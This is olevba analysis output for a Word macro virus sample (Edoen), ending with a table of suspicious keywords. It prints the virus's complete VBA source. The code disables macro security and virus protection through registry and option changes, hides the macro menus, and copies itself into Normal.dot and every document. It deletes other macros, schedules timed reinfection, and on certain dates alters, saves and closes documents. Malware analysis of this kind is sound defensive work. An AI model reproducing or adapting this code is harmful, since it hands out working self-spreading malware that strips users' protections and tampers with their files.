olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO edoen.bas 
in file: Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495 - OLE stream: 'Macros/VBA/edoen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Program pagujud
Public AD As Object
Public NT As Object
Public jum As Integer
Sub Document_Open()
On Error Resume Next
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
edoen.Amang
edoen.CopyDot
If cekNormal() = False Then edoen.Con
WordBasic.DisableAutoMacros True
End Sub
Private Sub Document_New()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
edoen.CopytoAD
End Sub
Sub FileTemplates()
edoen.CopytoAD
edoen.copYtoNT
End Sub
Sub FileExit()
On Error Resume Next
edoen.Amang
edoen.CopyDot
If cekNormal() = False Then edoen.Con
NormalTemplate.Save
Application.Quit
End Sub
Sub ToolsMacro()
dodol = MsgBox("Sorry teubisa dipake Mang !!!", vbInformation, "Berbahaya")
End Sub
Sub FileNew()
Dialogs(wdDialogFileNew).show
edoen.CopytoAD
End Sub
Sub FileSave()
On Error Resume Next
edoen.CopytoAD
ActiveDocument.Save
End Sub
Sub AutoExec()
On Error Resume Next
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
'Options.ConfirmConversion = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
'If cekNormal() <> True Then edoen.sinA
If cekNormal() = False Then edoen.Con
WordBasic.DisableAutoMacros True
Application.EnableCancelKey = wdCancelDisabled
AddIns.Unload False
edoen.Amang
Application.OnTime when:=Now + TimeValue("00:01:00"), Name:="edoen.rame1"
End Sub
Sub FileOpen()
On Error Resume Next
edoen.Amang
WordBasic.DisableAutoMacros True
If Dialogs(80).show <> 0 Then
edoen.CopytoAD
GoTo way
End If
edoen.CopytoAD
way:
End Sub
Sub AutoOpen()
On Error GoTo way
WordBasic.DisableAutoMacros True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "edoen") = "Sim salabim edoens"
End If
way:
On Error Resume Next
WordBasic.DisableAutoMacros False
edoen.CopytoAD
edoen.copYtoNT
edoen.CopytoAD
NormalTemplate.Save
End Sub
Sub Amang()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.ConfirmConversions = False
If cekNormal = True Then ayaeuY = True
If CekDocument = True Then ayaDoc = True
If ayaeuY = False Then edoen.copYtoNT
If ayaDoc = False Then edoen.CopytoAD
End Sub
Sub CopyDot()
On Error Resume Next
tempat = Options.DefaultFilePath(wdStartupPath)
copi = Dir(tempat + "\News.Dot")
If copi = "" Then
Set simpan = NormalTemplate.OpenAsDocument
With simpan
    .SaveAs fileName:=tempat + "\News.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic.hlp")
tempat = tempat + "\offic.hlp"
gg = VBE.ActiveVBProject.VBComponents.Count
If copi = "" Then
Application.VBE.ActiveVBProject.VBComponents("edoen").Export tempat
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic1.hlp")
tempat = tempat + "\offic1.hlp"
gg = VBE.ActiveVBProject.VBComponents.Count
If copi = "" Then
Application.VBE.ActiveVBProject.VBComponents("form").Export tempat
End If
End Sub
Sub pesan()
On Error Resume Next
hari = Day(Date)
bulan = Month(Date)
tahun = Year(Date)
If (hari >= 22 And (bulan = 11)) Or ((hari <= 15) And (bulan = 12)) Then
    form.show
End If
If (bulan >= 1) And (tahun >= 2001) Then
If (hari = 2) Or (hari = 5) Or (hari = 8) Or (hari = 13) Or (hari = 16) Or (hari = 21) Or (hari = 26) Or (hari = 27) Or (hari = 29) Then
edoen.bAntai
form.show
ActiveDocument.Save
End If
End If
End Sub
Sub Con()
    On Error Resume Next
On Error Resume Next
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic.hlp")
If copi <> "" Then
copi1 = tempat + "\offic.hlp"
NormalTemplate.VBProject.VBComponents.Import copi1
End If
tempat = Options.DefaultFilePath(wdProgramPath)
copi = Dir(tempat + "\offic1.hlp")
If copi <> "" Then
copi1 = tempat + "\offic1.hlp"
NormalTemplate.VBProject.VBComponents.Import copi1
End If
End Sub
Sub ViewVBCode()
    On Error Resume Next
MsgBox "not installed this section"
End Sub
Sub bAntai()
On Error Resume Next
Selection.InsertBefore Chr(13) + "Kudekap Tubuhmu" + Chr(13) + "Kukecup dahimu" + Chr(13) + "Kulumat Bibirmu" + Chr(13) + "Kutelusuri Seluruh Lekuk Tubuhmu" _
+ Chr(13) + "Ku Berdiri dan tersenyum" + Chr(13) + "Sambil Berlalu ku Ucapkan Selamat Tinggal" + Chr(13)
Selection.Font.Size = 14
Selection.Font.Italic = wdToggle
Selection.Font.Animation = wdAnimationShimmer
ActiveDocument.Select
ActiveDocument.UndoClear
ActiveDocument.Save
ActiveDocument.Close
End Sub
Function CopytoAD()
    On Error Resume Next
    WordBasic.DisableAutoMacros True
    ayaDoc = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    aya = 0
    For i = 1 To AD.VBProject.VBComponents.Count
      Namacr = AD.VBProject.VBComponents(i).Name
      If Namacr = "edoen" Then ayaDoc = True
      If (Namacr <> "edoen") And (Namacr <> "ThisDocument") And (Namacr <> "Reference to Normal") And (Namacr <> "form") And (Namacr <> "") Then
          MsgBox ("Sorry proses penghapusan virus macro " & Namacr), vbInformation, "Perhatian"
                Application.OrganizerDelete Source:=AD.FullName, _
          Name:=Namacr, Object:=wdOrganizerObjectProjectItems
          ActiveDocument.Save
      End If
    Next i
    If ayaDoc = False Then
    Application.OrganizerCopy Source:=NT.FullName, Destination:=AD.FullName, Name:="edoen", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "form", Object:=wdOrganizerObjectProjectItems
      AD.ReadOnlyRecommended = False
      ss = ActiveDocument.Name
      If "Document" <> Mid(ss, 1, 8) Then
        ActiveDocument.Save
      End If
      End If
      WordBasic.DisableAutoMacros True
End Function

Function copYtoNT()
    On Error Resume Next
    ayaDoc = False
    ayanor = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then ayanor = True
      If (nmacr <> "edoen") And _
        (nmacr <> "ThisDocument") And (nmacr <> "Reference to Normal") And (nmacr <> "form") And (nmacr <> "") Then
       MsgBox ("sorry proses penghapusan virus macro " & nmacr), vbInformation, "Proses Pembasmian"
                Application.OrganizerDelete Source:=NT.FullName, _
          Name:=nmacr, Object:=wdOrganizerObjectProjectItems
          NormalTemplate.Save
      End If
    Next i
If ayanor = False Then
    Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "edoen", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "form", Object:=wdOrganizerObjectProjectItems
          NormalTemplate.Save
End If
edoen.CopyDot
End Function
Function cekNormal() As Boolean
    On Error Resume Next
    ayanor = False
    Set NT = NormalTemplate
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then
      ayanor = True
      i = 100
      End If
    Next i
cekNormal = ayanor
End Function
Function CekDocument() As Boolean
    On Error Resume Next
    ayanor = False
    Set NT = ActiveDocument
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "edoen" Then
      ayanor = True
      i = 100
      End If
    Next i
    CekDocument = ayanor
End Function
Sub sinA()
tempat = Options.DefaultFilePath(wdStartupPath)
copi = tempat + "\*.dot"
Application.FileSearch.fileName = copi
Application.FileSearch.Execute
For i = 1 To Application.FileSearch.FoundFiles.Count
copi = Application.FileSearch.FoundFiles.Item(i)
If copi <> "news.dot" Then
edoen.CopytoAD
Application.Documents.Open (copi)
edoen.CopytoAD
Application.Documents.Close (Save)
End If
End Sub
Sub rame1()
pos = Options.DefaultFilePath(wdGraphicsFiltersPath)
If pos <> "" Then
Options.DefaultFilePath(wdStartupPath) = pos
edoen.CopyDot
End If
Application.OnTime when:=Now + TimeValue("01:00:00"), Name:="edoen.rame"
End Sub
Sub rame()
Application.Caption = "Cianjur Merdeka"
edoen.copYtoNT
edoen.CopytoAD
Application.OnTime when:=Now + TimeValue("01:00:00"), Name:="edoen.sory"
End Sub
Sub sory()
On Error Resume Next
edoen.pesan
edoen.rame
End Sub
Sub FilePrintPreview()
On Error Resume Next
edoen.copYtoNT
edoen.CopytoAD
ActiveDocument.PrintPreview
End Sub

-------------------------------------------------------------------------------
VBA MACRO form.frm 
in file: Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495 - OLE stream: 'Macros/VBA/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













































































Dim d As Integer
Dim tek As Integer
Dim txt As String
Private Sub CommandButton1_Click()
MsgBox "Anda belum beruntung silahkan coba lagi"
End Sub

Private Sub CommandButton1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
Label2.Visible = False
atas = Rnd * 123
kiri = Rnd * 222
CommandButton1.Top = atas
CommandButton1.Left = kiri
d = d + 2
Label1.Caption = Mid(txt, 1, d)
If d >= Len(txt) Then
    d = 0
    Label1.Caption = ""
End If
End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
tek = 2
End
End Sub

Private Sub UserForm_Activate()
'tempat = Options.DefaultFilePath(wdPicturesPath)
'form.Picture = tempat
Label2.Visible = True
Label2.Caption = "Salam buat semua teman-teman sepergerakan alumni SMUN Sukanagara"
d = 0
tek = 0
If (Day(Date) <= 4) And (Month(Date) = 1) Then
form.Caption = "Tahun Baru dimana mang !!!!!"
txt = "Selamat Tahun Baru, semoga ditahun yang baru ini kita mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
ElseIf (Day(Date) > 4) And (Month(Date) >= 1) And (Year(Date) >= 2001) Then
form.Caption = "Ah abdimah iseng wungkul"
txt = "Ini hanya program iseng saja tidak akan merusak file anda, jika anda ingin mengakhirinya double klik pada tulisan ini     "
ElseIf (Day(Date) = 4) And (Month(Date) >= 2) Then
form.Caption = "Ulang tahun Perlu dirayakan ?"
txt = "Selamat Ulang Tahun yang lahir pada tanggal 4, semoga menjadi lebih dewasa dan mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
'Else
'form.Caption = "Selamat Menunaikan ibadah Puasa"
'txt = "Yaa ayyuhalladzina aamanu kutiba alaikumusshiam kama kutiba alalladzina minkoblikum laallakum tattakuun, jika anda ingin mengakhirinya double klik pada tulisan ini    "
End If
Randomize
Label1.Caption = "Silahkan anda coba klik tombol OK sampai bisa dan baca tulusan yang ada dibawah, semoga anda berhasil"
End Sub

Private Sub UserForm_Terminate()
On Error Resume Next
If tek <> 2 Then
form.Hide
vv = MsgBox("Ceuk aing double clik tulisan nana", vbInformation, "Teungawaro")
form.UndoAction
form.show
tek = 1
End If
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Impact@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Edoen-3f84a3cf17438a9c8e0079599470158686d77495' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |CommandButton1_Mouse|Runs when the file is opened and ActiveX     |
|          |Move                |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
